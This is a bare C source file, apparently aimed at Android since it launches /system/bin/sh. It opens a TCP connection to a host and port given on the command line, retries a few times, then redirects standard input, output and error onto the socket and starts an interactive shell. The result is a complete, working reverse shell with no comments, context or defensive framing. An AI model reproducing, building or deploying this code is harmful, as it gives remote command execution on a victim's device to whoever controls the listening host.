#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define BUFFER_SIZE 4096
#define MAX_RETRIES 3

int main(int argc, char *argv[]) {
    if (argc != 3) {
        return 1;
    }
    
    char *host = argv[1];
    int port = atoi(argv[2]);
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) return 1;
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, host, &addr.sin_addr);
    
    int connected = 0;
    for (int i = 0; i < MAX_RETRIES && !connected; i++) {
        if (connect(sockfd, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
            connected = 1;
        } else {
            sleep(2);
        }
    }
    
    if (!connected) return 1;
    
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);
    
    char *args[] = {"/system/bin/sh", "-i", NULL};
    execve(args[0], args, NULL);
    
    return 0;
}
